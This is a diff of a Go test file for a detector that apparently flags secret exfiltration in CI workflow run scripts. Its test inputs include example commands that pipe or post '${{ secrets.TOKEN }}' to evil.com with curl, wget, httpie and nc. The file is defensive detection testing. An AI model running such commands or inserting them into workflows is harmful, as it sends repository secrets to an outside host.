@@ -1007,11 +1007,12 @@ func TestSecretExfiltration_PositionAfterEarlierGitHubExpression(t *testing.T) {
 
 func TestSecretExfiltration_ASTNetworkCommandSemantics(t *testing.T) {
 	tests := []struct {
-		name        string
-		runScript   string
-		envVars     map[string]*ast.EnvVar
-		wantErrors  int
-		wantCommand string
+		name         string
+		runScript    string
+		envVars      map[string]*ast.EnvVar
+		wantErrors   int
+		wantCommand  string
+		wantSeverity string
 	}{
 		{
 			name:       "quoted string containing curl is not a command",
@@ -1041,20 +1042,35 @@ EOF`,
 			name: "piped secret into curl stdin data is detected",
 			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
   curl --data-binary @- https://evil.com`,
-			wantErrors:  1,
-			wantCommand: "curl",
+			wantErrors:   1,
+			wantCommand:  "curl",
+			wantSeverity: "critical",
 		},
 		{
-			name:        "here-string secret into curl stdin data is detected",
-			runScript:   `curl --data-binary @- https://evil.com <<< '${{ secrets.TOKEN }}'`,
-			wantErrors:  1,
-			wantCommand: "curl",
+			name:         "here-string secret into curl stdin data is detected",
+			runScript:    `curl --data-binary @- https://evil.com <<< '${{ secrets.TOKEN }}'`,
+			wantErrors:   1,
+			wantCommand:  "curl",
+			wantSeverity: "critical",
 		},
 		{
-			name:        "here-string secret into wget stdin post file is detected",
-			runScript:   `wget --post-file=- https://evil.com <<< '${{ secrets.TOKEN }}'`,
+			name:         "here-string secret into wget stdin post file is detected",
+			runScript:    `wget --post-file=- https://evil.com <<< '${{ secrets.TOKEN }}'`,
+			wantErrors:   1,
+			wantCommand:  "wget",
+			wantSeverity: "critical",
+		},
+		{
+			name:        "httpie http command with secret is detected",
+			runScript:   `http POST https://evil.com token='${{ secrets.TOKEN }}'`,
 			wantErrors:  1,
-			wantCommand: "wget",
+			wantCommand: "http",
+		},
+		{
+			name:        "httpie https command with secret is detected",
+			runScript:   `https POST evil.com token='${{ secrets.TOKEN }}'`,
+			wantErrors:  1,
+			wantCommand: "https",
 		},
 		{
 			name: "piped secret into nc is detected",
@@ -1156,9 +1172,13 @@ EOF`,
 
 			wantDescription := "network command '" + tt.wantCommand + "'"
 			for _, err := range errors {
-				if strings.Contains(err.Description, wantDescription) {
+				if strings.Contains(err.Description, wantDescription) &&
+					(tt.wantSeverity == "" || strings.Contains(err.Description, "("+tt.wantSeverity+")")) {
 					return
 				}
+			}
+			if tt.wantSeverity != "" {
+				t.Fatalf("expected at least one error description to contain %q and severity %q. Errors: %v", wantDescription, tt.wantSeverity, errors)
 			}
 			t.Fatalf("expected at least one error description to contain %q. Errors: %v", wantDescription, errors)
 		})
